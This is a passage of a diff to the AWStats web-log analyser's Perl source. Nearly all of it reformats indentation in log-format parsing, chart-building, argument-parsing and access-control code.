+			  . ( scalar keys %egal ) . ".",
+			3
 		);
 	}
 	my %notsortedkeylist = ();
 	foreach my $key ( values %val )  { $notsortedkeylist{$key} = 1; }
 	foreach my $key ( values %egal ) { $notsortedkeylist{$key} = 1; }
 	@keylist = ();
-	@keylist = (
-		sort {
-			( $hashfororder->{$b} || 0 ) <=> ( $hashfororder->{$a} || 0 )
-		  } keys %notsortedkeylist
-	);
+	@keylist =
+	  ( sort { ( $hashfororder->{$b} || 0 ) <=> ( $hashfororder->{$a} || 0 ) }
+		  keys %notsortedkeylist );
 	if ($Debug) {
 		debug( "  BuildKeyList End (keylist size=" . (@keylist) . ")", 3 );
 	}
@@ -8163,7 +8259,7 @@ sub Lock_Update {
 			if ($Debug) { debug("Update lock file $DirLock/$lock is set"); }
 			open( LOCK, ">$DirLock/$lock" )
 			  || error( "Failed to create lock file $DirLock/$lock", "", "",
-						1 );
+				1 );
 			print LOCK
 "AWStats update started by process $$ at $nowyear-$nowmonth-$nowday $nowhour:$nowmin:$nowsec\n";
 			close(LOCK);
@@ -8235,9 +8331,11 @@ sub AtLeastOneNotNull {
 #------------------------------------------------------------------------------
 sub Tooltip {
 	my $ttnb = shift;
-	return ( $TOOLTIPON
-			 ? " onmouseover=\"ShowTip($ttnb);\" onmouseout=\"HideTip($ttnb);\""
-			 : "" );
+	return (
+		$TOOLTIPON
+		? " onmouseover=\"ShowTip($ttnb);\" onmouseout=\"HideTip($ttnb);\""
+		: ""
+	);
 }
 
 #------------------------------------------------------------------------------
@@ -8288,8 +8386,8 @@ sub ShowFormFilter {
 		if ( $QueryString =~ /(^|&|&amp;)year=(\d\d\d\d)/i ) {
 			print "<input type=\"hidden\" name=\"year\" value=\"$2\" />\n";
 		}
-		if (    $QueryString =~ /(^|&|&amp;)month=(\d\d)/i
-			 || $QueryString =~ /(^|&|&amp;)month=(all)/i )
+		if (   $QueryString =~ /(^|&|&amp;)month=(\d\d)/i
+			|| $QueryString =~ /(^|&|&amp;)month=(all)/i )
 		{
 			print "<input type=\"hidden\" name=\"month\" value=\"$2\" />\n";
 		}
@@ -8471,15 +8569,16 @@ sub DefinePerlParsingFormat {
 # Apache common_with_mod_gzip_info2: %h %l %u %t \"%r\" %>s %b mod_gzip: %{mod_gzip_result}n In:%{mod_gzip_input_size}n Out:%{mod_gzip_output_size}n:%{mod_gzip_compression_ratio}npct.
 # Apache deflate: %h %l %u %t \"%r\" %>s %b \"%{Referer}i\" \"%{User-Agent}i\" (%{ratio}n)
 	if ($Debug) {
-		debug(    "Call To DefinePerlParsingFormat (LogType='$LogType', LogFormat='$LogFormat')"
+		debug(
+"Call To DefinePerlParsingFormat (LogType='$LogType', LogFormat='$LogFormat')"
 		);
 	}
 	if ( $LogFormat =~ /^[1-6]$/ ) {    # Pre-defined log format
 		if ( $LogFormat eq '1' || $LogFormat eq '6' )
-		{ 	# Same than "%h %l %u %t \"%r\" %>s %b \"%{Referer}i\" \"%{User-Agent}i\"".
-			# %u (user) is "([^\\/\\[]+)" instead of "[^ ]+" because can contain space (Lotus Notes). referer and ua might be "".
+		{ # Same than "%h %l %u %t \"%r\" %>s %b \"%{Referer}i\" \"%{User-Agent}i\"".
+			 # %u (user) is "([^\\/\\[]+)" instead of "[^ ]+" because can contain space (Lotus Notes). referer and ua might be "".
 
-			# $PerlParsingFormat="([^ ]+) [^ ]+ ([^\\[]+) \\[([^ ]+) [^ ]+\\] \\\"([^ ]+) (.+) [^\\\"]+\\\" ([\\d|-]+) ([\\d|-]+) \\\"(.*?)\\\" \\\"([^\\\"]*)\\\"";
+# $PerlParsingFormat="([^ ]+) [^ ]+ ([^\\/\\[]+) \\[([^ ]+) [^ ]+\\] \\\"([^ ]+) (.+) [^\\\"]+\\\" ([\\d|-]+) ([\\d|-]+) \\\"(.*?)\\\" \\\"([^\\\"]*)\\\"";
 			$PerlParsingFormat =
 "([^ ]+) [^ ]+ ([^\\/\\[]+) \\[([^ ]+) [^ ]+\\] \\\"([^ ]+) ([^ ]+)(?: [^\\\"]+|)\\\" ([\\d|-]+) ([\\d|-]+) \\\"(.*?)\\\" \\\"([^\\\"]*)\\\"";
 			$pos_host    = 0;
@@ -8491,10 +8590,9 @@ sub DefinePerlParsingFormat {
 			$pos_size    = 6;
 			$pos_referer = 7;
 			$pos_agent   = 8;
-			@fieldlib = (
-						  'host', 'logname', 'date', 'method',
-						  'url',  'code',    'size', 'referer',
-						  'ua'
+			@fieldlib    = (
+				'host', 'logname', 'date', 'method', 'url', 'code',
+				'size', 'referer', 'ua'
 			);
 		}
 		elsif ( $LogFormat eq '2' )
@@ -8510,10 +8608,9 @@ sub DefinePerlParsingFormat {
 			$pos_size    = 6;
 			$pos_agent   = 7;
 			$pos_referer = 8;
-			@fieldlib = (
-						  'date', 'host', 'logname', 'method',
-						  'url',  'code', 'size',    'ua',
-						  'referer'
+			@fieldlib    = (
+				'date', 'host', 'logname', 'method', 'url', 'code',
+				'size', 'ua',   'referer'
 			);
 		}
 		elsif ( $LogFormat eq '3' ) {
@@ -8527,9 +8624,9 @@ sub DefinePerlParsingFormat {
 			$pos_referer = 5;
 			$pos_url     = 6;
 			$pos_size    = 7;
-			@fieldlib = (
-						  'date', 'method',  'code', 'host',
-						  'ua',   'referer', 'url',  'size'
+			@fieldlib    = (
+				'date', 'method',  'code', 'host',
+				'ua',   'referer', 'url',  'size'
 			);
 		}
 		elsif ( $LogFormat eq '4' ) {    # Same than "%h %l %u %t \"%r\" %>s %b"
@@ -8638,7 +8735,8 @@ sub DefinePerlParsingFormat {
 				$pos_logname = $i;
 				$i++;
 				push @fieldlib, 'logname';
-				# %u (user) is "([^\\/\\[]+)" instead of "[^$LogSeparatorWithoutStar]+" because can contain space (Lotus Notes).
+
+# %u (user) is "([^\\/\\[]+)" instead of "[^$LogSeparatorWithoutStar]+" because can contain space (Lotus Notes).
 				$PerlParsingFormat .= "([^\\/\\[]+)";
 			}
 
@@ -8686,6 +8784,7 @@ sub DefinePerlParsingFormat {
 				$i++;
 				push @fieldlib, 'url';
 				$PerlParsingFormat .=
+
 #"\\\"([^$LogSeparatorWithoutStar]+) ([^$LogSeparatorWithoutStar]+) [^\\\"]+\\\"";
 "\\\"([^$LogSeparatorWithoutStar]+) ([^$LogSeparatorWithoutStar]+)(?: [^\\\"]+|)\\\"";
 			}
@@ -8845,7 +8944,7 @@ sub DefinePerlParsingFormat {
 				$PerlParsingFormat .= "([^$LogSeparatorWithoutStar]+)";
 			}
 
-			# Special for protocolmms, used for method if method not already found (for MMS)
+# Special for protocolmms, used for method if method not already found (for MMS)
 			elsif ( $f =~ /%protocolmms$/ ) {
 				if ( $pos_method < 0 ) {
 					$pos_method = $i;
@@ -8855,7 +8954,7 @@ sub DefinePerlParsingFormat {
 				}
 			}
 
-			# Special for codemms, used for code only if code not already found (for MMS)
+   # Special for codemms, used for code only if code not already found (for MMS)
 			elsif ( $f =~ /%codemms$/ ) {
 				if ( $pos_code < 0 ) {
 					$pos_code = $i;
@@ -8891,27 +8990,33 @@ sub DefinePerlParsingFormat {
 		}
 	}
 	if ( $pos_host < 0 ) {
-		error(    "Your personalized LogFormat does not include all fields required by AWStats (Add \%host in your LogFormat string)."
+		error(
+"Your personalized LogFormat does not include all fields required by AWStats (Add \%host in your LogFormat string)."
 		);
 	}
 	if ( $pos_date < 0 ) {
-		error(    "Your personalized LogFormat does not include all fields required by AWStats (Add \%time1 or \%time2 in your LogFormat string)."
+		error(
+"Your personalized LogFormat does not include all fields required by AWStats (Add \%time1 or \%time2 in your LogFormat string)."
 		);
 	}
 	if ( $pos_method < 0 ) {
-		error(    "Your personalized LogFormat does not include all fields required by AWStats (Add \%methodurl or \%method in your LogFormat string)."
+		error(
+"Your personalized LogFormat does not include all fields required by AWStats (Add \%methodurl or \%method in your LogFormat string)."
 		);
 	}
 	if ( $pos_url < 0 ) {
-		error(    "Your personalized LogFormat does not include all fields required by AWStats (Add \%methodurl or \%url in your LogFormat string)."
+		error(
+"Your personalized LogFormat does not include all fields required by AWStats (Add \%methodurl or \%url in your LogFormat string)."
 		);
 	}
 	if ( $pos_code < 0 ) {
-		error(    "Your personalized LogFormat does not include all fields required by AWStats (Add \%code in your LogFormat string)."
+		error(
+"Your personalized LogFormat does not include all fields required by AWStats (Add \%code in your LogFormat string)."
 		);
 	}
 	if ( $pos_size < 0 ) {
-		error(    "Your personalized LogFormat does not include all fields required by AWStats (Add \%bytesd in your LogFormat string)."
+		error(
+"Your personalized LogFormat does not include all fields required by AWStats (Add \%bytesd in your LogFormat string)."
 		);
 	}
 	$PerlParsingFormat = qr/^$PerlParsingFormat/;
@@ -8920,7 +9025,7 @@ sub DefinePerlParsingFormat {
 
 sub ShowMenuCateg {
 	my ( $categ, $categtext, $categicon, $frame, $targetpage, $linkanchor,
-		 $NewLinkParams, $NewLinkTarget )
+		$NewLinkParams, $NewLinkTarget )
 	  = ( shift, shift, shift, shift, shift, shift, shift, shift );
 	$categicon = '';    # Comment this to enabme category icons
 	my ( $menu, $menulink, $menutext ) = ( shift, shift, shift );
@@ -8929,8 +9034,8 @@ sub ShowMenuCateg {
 	# Call to plugins' function AddHTMLMenuLink
 	foreach my $pluginname ( keys %{ $PluginsLoaded{'AddHTMLMenuLink'} } ) {
 
-		# my $function="AddHTMLMenuLink_$pluginname('$categ',\$menu,\$menulink,\$menutext)";
-		# eval("$function");
+# my $function="AddHTMLMenuLink_$pluginname('$categ',\$menu,\$menulink,\$menutext)";
+# eval("$function");
 		my $function = "AddHTMLMenuLink_$pluginname";
 		&$function( $categ, $menu, $menulink, $menutext );
 	}
@@ -8939,7 +9044,7 @@ sub ShowMenuCateg {
 	}
 	if ( !$linetitle ) { return; }
 
-	# At least one entry in menu for this category, we can show category and entries
+# At least one entry in menu for this category, we can show category and entries
 	my $WIDTHMENU1 = ( $FrameName eq 'mainleft' ? $FRAMEWIDTH : 150 );
 	print "<tr><td class=\"awsm\" width=\"$WIDTHMENU1\""
 	  . ( $frame ? "" : " valign=\"top\"" ) . ">"
@@ -8957,12 +9062,15 @@ sub ShowMenuCateg {
 		if ( $menulink->{$key} == 2 ) {
 			print( $frame
 				? "<tr><td class=\"awsm\"> &nbsp; <img height=\"8\" width=\"9\" src=\"$DirIcons/other/page.png\" alt=\"...\" /> "
-				: "" );
+				: ""
+			);
 			print "<a href=\""
-			  . ( $ENV{'GATEWAY_INTERFACE'}
-					|| !$StaticLinks
-				  ? XMLEncode("$AWScript?${NewLinkParams}output=$key")
-				  : "$PROG$StaticLinks.$key.$StaticExt" )
+			  . (
+				$ENV{'GATEWAY_INTERFACE'}
+				  || !$StaticLinks
+				? XMLEncode("$AWScript?${NewLinkParams}output=$key")
+				: "$PROG$StaticLinks.$key.$StaticExt"
+			  )
 			  . "\"$NewLinkTarget>$menutext->{$key}</a>\n";
 			print( $frame? "</td></tr>\n" : " &nbsp; " );
 		}
@@ -8997,18 +9105,21 @@ sub ShowEmailSendersChart {
 	else {
 		$title =
 "$Message[131] ($Message[77] $MaxNbOf{'EMailsShown'}) &nbsp; - &nbsp; <a href=\""
-		  . ( $ENV{'GATEWAY_INTERFACE'}
-				|| !$StaticLinks
-			  ? XMLEncode("$AWScript?${NewLinkParams}output=allemails")
-			  : "$PROG$StaticLinks.allemails.$StaticExt" )
+		  . (
+			$ENV{'GATEWAY_INTERFACE'}
+			  || !$StaticLinks
+			? XMLEncode("$AWScript?${NewLinkParams}output=allemails")
+			: "$PROG$StaticLinks.allemails.$StaticExt"
+		  )
 		  . "\"$NewLinkTarget>$Message[80]</a>";
 		if ( $ShowEMailSenders =~ /L/i ) {
-			$title .=
-			  " &nbsp; - &nbsp; <a href=\""
-			  . ( $ENV{'GATEWAY_INTERFACE'}
-					|| !$StaticLinks
-				  ? XMLEncode("$AWScript?${NewLinkParams}output=lastemails")
-				  : "$PROG$StaticLinks.lastemails.$StaticExt" )
+			$title .= " &nbsp; - &nbsp; <a href=\""
+			  . (
+				$ENV{'GATEWAY_INTERFACE'}
+				  || !$StaticLinks
+				? XMLEncode("$AWScript?${NewLinkParams}output=lastemails")
+				: "$PROG$StaticLinks.lastemails.$StaticExt"
+			  )
 			  . "\"$NewLinkTarget>$Message[9]</a>";
 		}
 	}
@@ -9048,15 +9159,15 @@ sub ShowEmailSendersChart {
 	my $count = 0;
 	if ( !$HTMLOutput{'allemails'} && !$HTMLOutput{'lastemails'} ) {
 		&BuildKeyList( $MaxNbOf{'EMailsShown'}, $MinHit{'EMail'}, \%_emails_h,
-					   \%_emails_h );
+			\%_emails_h );
 	}
 	if ( $HTMLOutput{'allemails'} ) {
 		&BuildKeyList( $MaxRowsInHTMLOutput, $MinHit{'EMail'}, \%_emails_h,
-					   \%_emails_h );
+			\%_emails_h );
 	}
 	if ( $HTMLOutput{'lastemails'} ) {
 		&BuildKeyList( $MaxRowsInHTMLOutput, $MinHit{'EMail'}, \%_emails_h,
-					   \%_emails_l );
+			\%_emails_l );
 	}
 	foreach my $key (@keylist) {
 		my $newkey = $key;
@@ -9153,18 +9264,21 @@ sub ShowEmailReceiversChart {
 	else {
 		$title =
 "$Message[132] ($Message[77] $MaxNbOf{'EMailsShown'}) &nbsp; - &nbsp; <a href=\""
-		  . ( $ENV{'GATEWAY_INTERFACE'}
-				|| !$StaticLinks
-			  ? XMLEncode("$AWScript?${NewLinkParams}output=allemailr")
-			  : "$PROG$StaticLinks.allemailr.$StaticExt" )
+		  . (
+			$ENV{'GATEWAY_INTERFACE'}
+			  || !$StaticLinks
+			? XMLEncode("$AWScript?${NewLinkParams}output=allemailr")
+			: "$PROG$StaticLinks.allemailr.$StaticExt"
+		  )
 		  . "\"$NewLinkTarget>$Message[80]</a>";
 		if ( $ShowEMailReceivers =~ /L/i ) {
-			$title .=
-			  " &nbsp; - &nbsp; <a href=\""
-			  . ( $ENV{'GATEWAY_INTERFACE'}
-					|| !$StaticLinks
-				  ? XMLEncode("$AWScript?${NewLinkParams}output=lastemailr")
-				  : "$PROG$StaticLinks.lastemailr.$StaticExt" )
+			$title .= " &nbsp; - &nbsp; <a href=\""
+			  . (
+				$ENV{'GATEWAY_INTERFACE'}
+				  || !$StaticLinks
+				? XMLEncode("$AWScript?${NewLinkParams}output=lastemailr")
+				: "$PROG$StaticLinks.lastemailr.$StaticExt"
+			  )
 			  . "\"$NewLinkTarget>$Message[9]</a>";
 		}
 	}
@@ -9204,15 +9318,15 @@ sub ShowEmailReceiversChart {
 	my $count = 0;
 	if ( !$HTMLOutput{'allemailr'} && !$HTMLOutput{'lastemailr'} ) {
 		&BuildKeyList( $MaxNbOf{'EMailsShown'}, $MinHit{'EMail'}, \%_emailr_h,
-					   \%_emailr_h );
+			\%_emailr_h );
 	}
 	if ( $HTMLOutput{'allemailr'} ) {
 		&BuildKeyList( $MaxRowsInHTMLOutput, $MinHit{'EMail'}, \%_emailr_h,
-					   \%_emailr_h );
+			\%_emailr_h );
 	}
 	if ( $HTMLOutput{'lastemailr'} ) {
 		&BuildKeyList( $MaxRowsInHTMLOutput, $MinHit{'EMail'}, \%_emailr_h,
-					   \%_emailr_l );
+			\%_emailr_l );
 	}
 	foreach my $key (@keylist) {
 		my $newkey = $key;
@@ -9330,8 +9444,8 @@ $nowtime = int( $nowyear . $nowmonth . $nowday . $nowhour . $nowmin . $nowsec );
 
 # Get tomorrow time (will be used to discard some record with corrupted date (future date))
 my (
-	 $tomorrowsec, $tomorrowmin,   $tomorrowhour,
-	 $tomorrowday, $tomorrowmonth, $tomorrowyear
+	$tomorrowsec, $tomorrowmin,   $tomorrowhour,
+	$tomorrowday, $tomorrowmonth, $tomorrowyear
   )
   = localtime( $starttime + 86400 );
 if ( $tomorrowyear < 100 ) { $tomorrowyear += 2000; }
@@ -9342,32 +9456,32 @@ if ( $tomorrowhour < 10 )    { $tomorrowhour  = "0$tomorrowhour"; }
 if ( $tomorrowmin < 10 )     { $tomorrowmin   = "0$tomorrowmin"; }
 if ( $tomorrowsec < 10 )     { $tomorrowsec   = "0$tomorrowsec"; }
 $tomorrowtime =
-  int(   $tomorrowyear
-	   . $tomorrowmonth
-	   . $tomorrowday
-	   . $tomorrowhour
-	   . $tomorrowmin
-	   . $tomorrowsec );
+  int(  $tomorrowyear
+	  . $tomorrowmonth
+	  . $tomorrowday
+	  . $tomorrowhour
+	  . $tomorrowmin
+	  . $tomorrowsec );
 
 # Allowed option
 my @AllowedCLIArgs = (
-					   'migrate',            'config',
-					   'logfile',            'output',
-					   'runascli',           'update',
-					   'staticlinks',        'staticlinksext',
-					   'noloadplugin',       'loadplugin',
-					   'hostfilter',         'urlfilter',
-					   'refererpagesfilter', 'lang',
-					   'month',              'year',
-					   'framename',          'debug',
-					   'showsteps',          'showdropped',
-					   'showcorrupted',      'showunknownorigin',
-					   'showdirectorigin',   'limitflush',
-					   'confdir',            'updatefor',
-					   'hostfilter',         'hostfilterex',
-					   'urlfilter',          'urlfilterex',
-					   'refererpagesfilter', 'refererpagesfilterex',
-					   'pluginmode',         'filterrawlog'
+	'migrate',            'config',
+	'logfile',            'output',
+	'runascli',           'update',
+	'staticlinks',        'staticlinksext',
+	'noloadplugin',       'loadplugin',
+	'hostfilter',         'urlfilter',
+	'refererpagesfilter', 'lang',
+	'month',              'year',
+	'framename',          'debug',
+	'showsteps',          'showdropped',
+	'showcorrupted',      'showunknownorigin',
+	'showdirectorigin',   'limitflush',
+	'confdir',            'updatefor',
+	'hostfilter',         'hostfilterex',
+	'urlfilter',          'urlfilterex',
+	'refererpagesfilter', 'refererpagesfilterex',
+	'pluginmode',         'filterrawlog'
 );
 
 # Parse input parameters and sanitize them for security reasons
@@ -9397,7 +9511,8 @@ if ( $ENV{'GATEWAY_INTERFACE'} ) {    # Run from a browser as CGI
 
 	# Security test
 	if ( $QueryString =~ /LogFile=([^&]+)/i ) {
-		error(    "Logfile parameter can't be overwritten when AWStats is used from a CGI"
+		error(
+"Logfile parameter can't be overwritten when AWStats is used from a CGI"
 		);
 	}
 
@@ -9478,10 +9593,11 @@ else {                             # Run from command line
 	$QueryString = CleanXSS($QueryString);
 
 	# Security test
-	if (    $ENV{'AWSTATS_DEL_GATEWAY_INTERFACE'}
-		 && $QueryString =~ /LogFile=([^&]+)/i )
+	if (   $ENV{'AWSTATS_DEL_GATEWAY_INTERFACE'}
+		&& $QueryString =~ /LogFile=([^&]+)/i )
 	{
-		error(    "Logfile parameter can't be overwritten when AWStats is used from a CGI"
+		error(
+"Logfile parameter can't be overwritten when AWStats is used from a CGI"
 		);
 	}
 
@@ -9575,7 +9691,7 @@ if ( $QueryString =~ /(^|&|&amp;)limitflush=(\d+)/i ) { $LIMITFLUSH = $2; }
 
 # Get/Define output
 if ( $QueryString =~
-	 /(^|&|&amp;)output(=[^&]*|)(.*)(&|&amp;)output(=[^&]*|)(&|$)/i )
+	/(^|&|&amp;)output(=[^&]*|)(.*)(&|&amp;)output(=[^&]*|)(&|$)/i )
 {
 	error( "Only 1 output option is allowed", "", "", 1 );
 }
@@ -9651,18 +9767,17 @@ if ( $ENV{'AWSTATS_CONFIG'} ) {
 }    # For backward compatibility
 if ( $ENV{'AWSTATS_FORCE_CONFIG'} ) {
 	if ($Debug) {
-		debug(   "AWSTATS_FORCE_CONFIG parameter is defined to '"
-			   . $ENV{'AWSTATS_FORCE_CONFIG'}
-			   . "'. $PROG will use this as config value." );
+		debug(  "AWSTATS_FORCE_CONFIG parameter is defined to '"
+			  . $ENV{'AWSTATS_FORCE_CONFIG'}
+			  . "'. $PROG will use this as config value." );
 	}
 	$SiteConfig = &Sanitize( $ENV{'AWSTATS_FORCE_CONFIG'} );
 }
 
 if ( ( !$ENV{'GATEWAY_INTERFACE'} ) && ( !$SiteConfig ) ) {
 	&Read_Ref_Data(
-					'browsers',          'domains',
-					'operating_systems', 'robots',
-					'search_engines',    'worms'
+		'browsers',       'domains', 'operating_systems', 'robots',
+		'search_engines', 'worms'
 	);
 	print "----- $PROG $VERSION (c) 2000-2008 Laurent Destailleur -----\n";
 	print
@@ -9835,7 +9950,8 @@ if ( !$Lang || $Lang eq 'auto' ) {    # If lang not defined or forced to auto
 	if ($Debug) {
 		debug(
 			"Search an available language among HTTP_ACCEPT_LANGUAGE=$langlist",
-			1 );
+			1
+		);
 	}
 	foreach my $code ( split( /,/, $langlist ) )
 	{                                 # Search for a valid lang in priority
@@ -9865,16 +9981,17 @@ if ( !$Lang || $Lang eq 'auto' ) {
 # Now SiteDomain is defined
 
 if ( $Debug && !$DebugMessages ) {
-	error( "Debug has not been allowed. Change DebugMessages parameter in config file to allow debug."
+	error(
+"Debug has not been allowed. Change DebugMessages parameter in config file to allow debug."
 	);
 }
 
 # Define frame name and correct variable for frames
 if ( !$FrameName ) {
-	if (    $ENV{'GATEWAY_INTERFACE'}
-		 && $UseFramesWhenCGI
-		 && $HTMLOutput{'main'}
-		 && !$PluginMode )
+	if (   $ENV{'GATEWAY_INTERFACE'}
+		&& $UseFramesWhenCGI
+		&& $HTMLOutput{'main'}
+		&& !$PluginMode )
 	{
 		$FrameName = 'index';
 	}
@@ -9888,8 +10005,8 @@ if ( $FrameName ne 'index' ) {
 	if ( $FrameName ne 'mainleft' ) {
 		my %datatoload = ();
 		my (
-			 $filedomains, $filemime, $filerobots, $fileworms,
-			 $filebrowser, $fileos,   $filese
+			$filedomains, $filemime, $filerobots, $fileworms,
+			$filebrowser, $fileos,   $filese
 		  )
 		  = (
 			'domains',  'mime',
@@ -9987,7 +10104,8 @@ if ( $AllowAccessFromWebToAuthenticatedUsersOnly && $ENV{'GATEWAY_INTERFACE'} )
 {
 	if ($Debug) { debug( "REMOTE_USER=" . $ENV{"REMOTE_USER"} ); }
 	if ( !$ENV{"REMOTE_USER"} ) {
-		error(    "Access to statistics is only allowed from an authenticated session to authenticated users."
+		error(
+"Access to statistics is only allowed from an authenticated session to authenticated users."
 		);
 	}
 	if (@AllowAccessFromWebToFollowingAuthenticatedUsers) {
@@ -10000,9 +10118,9 @@ if ( $AllowAccessFromWebToAuthenticatedUsersOnly && $ENV{'GATEWAY_INTERFACE'} )
 			if (/$currentuser/o) { $userisinlist = 1; last; }
 		}
 		if ( !$userisinlist ) {
-			error("User '"
-				. $ENV{"REMOTE_USER"}
-				. "' is not allowed to access statistics of this domain/config."
+			error(  "User '"
+				  . $ENV{"REMOTE_USER"}
+				  . "' is not allowed to access statistics of this domain/config."
 			);
 		}
 	}
@@ -10015,17 +10133,18 @@ if ( $AllowAccessFromWebToFollowingIPAddresses && $ENV{'GATEWAY_INTERFACE'} ) {
 	my $allowaccess = 0;
 	foreach my $ipaddressrange (@allowaccessfromipaddresses) {
 		if ( $ipaddressrange !~
-			 /^(\d+\.\d+\.\d+\.\d+)(?:-(\d+\.\d+\.\d+\.\d+))*$/
-			 && $ipaddressrange !~
-			 /^([0-9A-Fa-f]{1,4}:){1,7}(:|)([0-9A-Fa-f]{1,4}|\/\d)/ )
+			/^(\d+\.\d+\.\d+\.\d+)(?:-(\d+\.\d+\.\d+\.\d+))*$/
+			&& $ipaddressrange !~
+			/^([0-9A-Fa-f]{1,4}:){1,7}(:|)([0-9A-Fa-f]{1,4}|\/\d)/ )
 		{
-			error(       "AllowAccessFromWebToFollowingIPAddresses is defined to '$AllowAccessFromWebToFollowingIPAddresses' but part of value does not match the correct syntax: IPv4AddressMin[-IPv4AddressMax] or IPv6Address[\/prefix] in \"$ipaddressrange\""
+			error(
+"AllowAccessFromWebToFollowingIPAddresses is defined to '$AllowAccessFromWebToFollowingIPAddresses' but part of value does not match the correct syntax: IPv4AddressMin[-IPv4AddressMax] or IPv6Address[\/prefix] in \"$ipaddressrange\""
 			);
 		}
 
 		# Test ip v4
 		if ( $ipaddressrange =~
-			 /^(\d+\.\d+\.\d+\.\d+)(?:-(\d+\.\d+\.\d+\.\d+))*$/ )
+			/^(\d+\.\d+\.\d+\.\d+)(?:-(\d+\.\d+\.\d+\.\d+))*$/ )
 		{
 			my $ipmin = &Convert_IP_To_Decimal($1);
 			my $ipmax = $2 ? &Convert_IP_To_Decimal($2) : $ipmin;
@@ -10040,7 +10159,7 @@ if ( $AllowAccessFromWebToFollowingIPAddresses && $ENV{'GATEWAY_INTERFACE'} ) {
 
 		# Test ip v6
 		if ( $ipaddressrange =~
-			 /^([0-9A-Fa-f]{1,4}:){1,7}(:|)([0-9A-Fa-f]{1,4}|\/\d)/ )
+			/^([0-9A-Fa-f]{1,4}:){1,7}(:|)([0-9A-Fa-f]{1,4}|\/\d)/ )
 		{
 			if ( $ipaddressrange =~ /::\// ) {
 				my @IPv6split = split( /::/, $ipaddressrange );
@@ -10057,25 +10176,27 @@ if ( $AllowAccessFromWebToFollowingIPAddresses && $ENV{'GATEWAY_INTERFACE'} ) {
 	}
 	if ( !$allowaccess ) {
 		error( "Access to statistics is not allowed from your IP Address "
-			   . $ENV{"REMOTE_ADDR"} );
+			  . $ENV{"REMOTE_ADDR"} );
 	}
 }
-if (    ( $UpdateStats || $MigrateStats )
-	 && ( !$AllowToUpdateStatsFromBrowser )
-	 && $ENV{'GATEWAY_INTERFACE'} )
+if (   ( $UpdateStats || $MigrateStats )
+	&& ( !$AllowToUpdateStatsFromBrowser )
+	&& $ENV{'GATEWAY_INTERFACE'} )
 {
-	error(""
-		. ( $UpdateStats ? "Update" : "Migrate" )
-		. " of statistics has not been allowed from a browser (AllowToUpdateStatsFromBrowser should be set to 1)."
+	error(  ""
+		  . ( $UpdateStats ? "Update" : "Migrate" )
+		  . " of statistics has not been allowed from a browser (AllowToUpdateStatsFromBrowser should be set to 1)."
 	);
 }
 if ( scalar keys %HTMLOutput && $MonthRequired eq 'all' ) {
 	if ( !$AllowFullYearView ) {
-		error(    "Full year view has not been allowed (AllowFullYearView is set to 0)."
+		error(
+"Full year view has not been allowed (AllowFullYearView is set to 0)."
 		);
 	}
 	if ( $AllowFullYearView < 3 && $ENV{'GATEWAY_INTERFACE'} ) {
-		error(    "Full year view has not been allowed from a browser (AllowFullYearView should be set to 3)."
+		error(
+"Full year view has not been allowed from a browser (AllowFullYearView should be set to 3)."
 		);
 	}
 }
@@ -10086,7 +10207,7 @@ if ( scalar keys %HTMLOutput && $MonthRequired eq 'all' ) {
 if ($MigrateStats) {
 	if ($Debug) { debug( "MigrateStats is $MigrateStats", 2 ); }
 	if ( $MigrateStats !~
-		 /^(.*)$PROG(\d\d)(\d\d\d\d)(\d{0,2})(\d{0,2})(.*)\.txt$/ )
+		/^(.*)$PROG(\d\d)(\d\d\d\d)(\d{0,2})(\d{0,2})(.*)\.txt$/ )
 	{
 		error(
 "AWStats history file name must match following syntax: ${PROG}MMYYYY[.config].txt",
@@ -10114,13 +10235,13 @@ if ($MigrateStats) {
 	if ($EnableLockForUpdate) { &Lock_Update(1); }
 	my $newhistory =
 	  &Read_History_With_TmpUpdate( $YearRequired, $MonthRequired, $DayRequired,
-									$HourRequired, 1, 0, 'all' );
+		$HourRequired, 1, 0, 'all' );
 	if ( rename( "$newhistory", "$MigrateStats" ) == 0 ) {
 		unlink "$newhistory";
 		error(
 "Failed to rename \"$newhistory\" into \"$MigrateStats\".\nWrite permissions on \"$MigrateStats\" might be wrong"
 			  . (
-				  $ENV{'GATEWAY_INTERFACE'} ? " for a 'migration from web'" : ""
+				$ENV{'GATEWAY_INTERFACE'} ? " for a 'migration from web'" : ""
 			  )
 			  . " or file might be opened."
 		);
@@ -10162,18 +10283,16 @@ if ( $FrameName eq 'index' ) {
 }
 
 %MonthNumLib = (
-				 "01", "$Message[60]", "02", "$Message[61]",
-				 "03", "$Message[62]", "04", "$Message[63]",
-				 "05", "$Message[64]", "06", "$Message[65]",
-				 "07", "$Message[66]", "08", "$Message[67]",
-				 "09", "$Message[68]", "10", "$Message[69]",
-				 "11", "$Message[70]", "12", "$Message[71]"
+	"01", "$Message[60]", "02", "$Message[61]", "03", "$Message[62]",
+	"04", "$Message[63]", "05", "$Message[64]", "06", "$Message[65]",
+	"07", "$Message[66]", "08", "$Message[67]", "09", "$Message[68]",
+	"10", "$Message[69]", "11", "$Message[70]", "12", "$Message[71]"
 );
 
 # Build ListOfYears list with all existing years
 (
-   $lastyearbeforeupdate, $lastmonthbeforeupdate, $lastdaybeforeupdate,
-   $lasthourbeforeupdate, $lastdatebeforeupdate
+	$lastyearbeforeupdate, $lastmonthbeforeupdate, $lastdaybeforeupdate,
+	$lasthourbeforeupdate, $lastdatebeforeupdate
   )
   = ( 0, 0, 0, 0, 0 );
 my $datemask = '';
@@ -10185,13 +10304,14 @@ elsif ( $DatabaseBreak eq 'hour' )  {
 }
 
 if ($Debug) {
-	debug( "Scan for last history files into DirData='$DirData' with mask='$datemask'"
+	debug(
+"Scan for last history files into DirData='$DirData' with mask='$datemask'"
 	);
 }
 opendir( DIR, "$DirData" );
 my $regfilesuffix = quotemeta($FileSuffix);
 foreach ( grep /^$PROG$datemask$regfilesuffix\.txt(|\.gz)$/i,
-		  file_filt sort readdir DIR )
+	file_filt sort readdir DIR )
 {
 	/^$PROG$datemask$regfilesuffix\.txt(|\.gz)$/i;
 	if ( !$ListOfYears{"$2"} || "$1" gt $ListOfYears{"$2"} ) {
@@ -10216,15 +10336,8 @@ close DIR;
 if ($lastyearbeforeupdate) {
 
 	# Read 'general' section of last history file for LastLine
-	&Read_History_With_TmpUpdate(
-								  $lastyearbeforeupdate,
-								  $lastmonthbeforeupdate,
-								  $lastdaybeforeupdate,
-								  $lasthourbeforeupdate,
-								  0,
-								  0,
-								  "general"
-	);
+	&Read_History_With_TmpUpdate( $lastyearbeforeupdate, $lastmonthbeforeupdate,
+		$lastdaybeforeupdate, $lasthourbeforeupdate, 0, 0, "general" );
 }
 
 # Warning if lastline in future
